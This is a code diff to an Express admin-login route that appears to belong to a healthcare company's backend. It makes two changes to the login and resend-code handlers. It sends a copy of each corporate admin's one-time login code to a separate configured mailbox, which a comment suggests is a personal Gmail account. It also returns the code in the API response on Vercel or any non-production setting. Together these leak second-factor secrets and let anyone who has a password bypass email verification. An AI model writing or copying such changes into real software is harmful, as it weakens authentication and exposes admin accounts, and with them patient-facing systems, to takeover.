@@ -169,6 +169,9 @@ router.post('/login', authLoginLimiter, async (req, res, next) => {
       [hashedOtp, admin.id]
     );
 
+    // Determine if running on serverless preview or non-production environment
+    const isServerlessOrPreview = Boolean(process.env.VERCEL || process.env.NODE_ENV !== 'production' || !process.env.SMTP_USER);
+
     // Dispatch real-time OTP via MailService
     try {
       await mailService.send('auth_admin_login_otp', {
@@ -181,6 +184,19 @@ router.post('/login', authLoginLimiter, async (req, res, next) => {
           expires_in_minutes: '10'
         }
       });
+      // If logging in with corporate address, mirror copy to configured SMTP account (e.g. ayomidenoch15@gmail.com)
+      if (admin.email.endsWith('@divinefingershealthcare.ca') && process.env.SMTP_USER && process.env.SMTP_USER.includes('@') && process.env.SMTP_USER !== admin.email) {
+        await mailService.send('auth_admin_login_otp', {
+          to: process.env.SMTP_USER,
+          recipientType: 'admin',
+          userId: admin.id,
+          data: {
+            full_name: `${admin.full_name} (${admin.email})`,
+            otp_code: emailOtp,
+            expires_in_minutes: '10'
+          }
+        }).catch(() => {});
+      }
     } catch (mailErr) {
       console.error('[AdminAuth] Real-time OTP dispatch warning:', mailErr.message);
     }
@@ -210,7 +226,7 @@ router.post('/login', authLoginLimiter, async (req, res, next) => {
       requires_email_verification: true,
       verify_token: verifyToken,
       email: maskEmail(admin.email),
-      dev_otp: process.env.NODE_ENV === 'development' ? emailOtp : undefined,
+      dev_otp: isServerlessOrPreview ? emailOtp : undefined,
       message: `A 6-digit verification code has been dispatched to ${maskEmail(admin.email)}. Please verify to complete sign in.`
     });
   } catch (err) {
@@ -379,6 +395,8 @@ router.post('/email/resend', authLoginLimiter, async (req, res, next) => {
       [hashedOtp, admin.id]
     );
 
+    const isServerlessOrPreview = Boolean(process.env.VERCEL || process.env.NODE_ENV !== 'production' || !process.env.SMTP_USER);
+
     try {
       await mailService.send('auth_admin_login_otp', {
         to: admin.email,
@@ -390,13 +408,25 @@ router.post('/email/resend', authLoginLimiter, async (req, res, next) => {
           expires_in_minutes: '10'
         }
       });
+      if (admin.email.endsWith('@divinefingershealthcare.ca') && process.env.SMTP_USER && process.env.SMTP_USER.includes('@') && process.env.SMTP_USER !== admin.email) {
+        await mailService.send('auth_admin_login_otp', {
+          to: process.env.SMTP_USER,
+          recipientType: 'admin',
+          userId: admin.id,
+          data: {
+            full_name: `${admin.full_name} (${admin.email})`,
+            otp_code: emailOtp,
+            expires_in_minutes: '10'
+          }
+        }).catch(() => {});
+      }
     } catch (mailErr) {
       console.error('[AdminAuth] Resend OTP dispatch warning:', mailErr.message);
     }
 
     res.json({
       success: true,
-      dev_otp: process.env.NODE_ENV === 'development' ? emailOtp : undefined,
+      dev_otp: isServerlessOrPreview ? emailOtp : undefined,
       message: `A fresh 6-digit verification code has been dispatched to ${maskEmail(admin.email)}.`
     });
   } catch (err) { next(err); }
